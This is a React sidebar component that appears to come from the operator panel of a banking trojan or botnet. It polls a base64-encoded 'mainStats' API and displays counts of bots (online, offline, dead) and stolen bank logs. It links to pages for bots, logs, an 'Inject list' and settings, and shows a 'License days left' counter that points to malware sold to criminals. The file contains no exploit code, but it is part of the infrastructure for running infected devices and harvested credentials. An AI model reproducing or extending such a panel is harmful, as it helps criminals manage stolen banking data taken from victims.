import React from 'react';
import { Link, NavLink } from 'react-router-dom';
import SettingsContext from '../Settings';
import { try_eval } from '../serviceF';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';

class SideBarMenu extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
            error: null,
            isLoaded: false,
            stats_banks: "0",
            stats_bots: "0",
            stats_cards: "0",
            stats_dead: "0",
            stats_mails: "0",
            stats_offline: "0",
            stats_online: "0"
        };

        this.onLoadJson = this.onLoadJson.bind(this);
    }

    componentDidMount() {
        this.onLoadJson();
    }

    autoUpdate() {
        if(SettingsContext.autoUpdateEnable)
            this._timer = setInterval(() => this.onLoadJson(), SettingsContext.autoUpdateDelay);
    }

    componentWillReceiveProps(newProps) {
        this.onLoadJson();
    }

    componentWillUnmount() {
        this.DisableTimer();
    }

    DisableTimer() {
        if (this._timer) {
            clearInterval(this._timer);
            this._timer = null;
        }
    }

    async onLoadJson () {
        this.DisableTimer();
        while(isNullOrUndefined(SettingsContext.restApiUrl)) await SettingsContext.sleep(500);
        while(SettingsContext.restApiUrl.length < 15) await SettingsContext.sleep(500);

        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer('{"request":"mainStats"}').toString('base64')
            }
        });

        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error))
				{
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else
				{
					this.setState({
						isLoaded: true,
						stats_banks: result.banks,
						stats_bots: result.bots,
						stats_dead: result.dead,
						stats_offline: result.offline,
						stats_online: result.online
					});
				}
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error loading main stats. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));

        this.autoUpdate();
    }

    defaultOnClickAction () { 
        this.onLoadJson();
        try_eval('document.getElementById("sidebar").style.display = "";document.getElementById("blackbox").style.display = "";');
    }

    render () {
        return (
            <React.Fragment>{/** Наши линки на страницы роутера */}
                <div class="navLink disable-select">
                    <div class="NavItem"><NavLink onClick={this.defaultOnClickAction.bind(this)} activeClassName="selected" to="/main">Main</NavLink></div>
                    <div class="NavItem"><NavLink onClick={this.defaultOnClickAction.bind(this)} activeClassName="selected" to="/bots">Bots</NavLink></div>
                    <div class="NavItem"><NavLink onClick={this.defaultOnClickAction.bind(this)} activeClassName="selected" to="/bank">Logs</NavLink></div>
                    <div class="NavItem"><NavLink onClick={this.defaultOnClickAction.bind(this)} activeClassName="selected" to="/inj">Inject list</NavLink></div>
                    <div class="NavItem"><NavLink onClick={this.defaultOnClickAction.bind(this)} activeClassName="selected" to="/settings">Settings</NavLink></div>
                </div>
                <hr style={({marginBottom: '0px'})} />
                <div class="ministats">
                    <p class="disable-select text-center">
                    <span class="debug">Bots: {this.state.stats_bots}</span> | <span class="info">Online: {this.state.stats_online}</span> | <span class="warn">Offline: {this.state.stats_offline}</span></p>
                    <p class="disable-select text-center">
                    <span class="error">Dead: {this.state.stats_dead}</span> | <span class="warna">Logs: {this.state.stats_banks}</span></p>
                    <p class="disable-select text-right" style={({marginTop:"-5px"})}>Panel {SettingsContext.panelVersion}</p>
                    <p class="disable-select text-right info" style={({marginTop:"-5px"})}>License days left <span class="warn">{SettingsContext.licensedays}</span></p>
                </div>
            </React.Fragment>
        );
    }
}

export default SideBarMenu;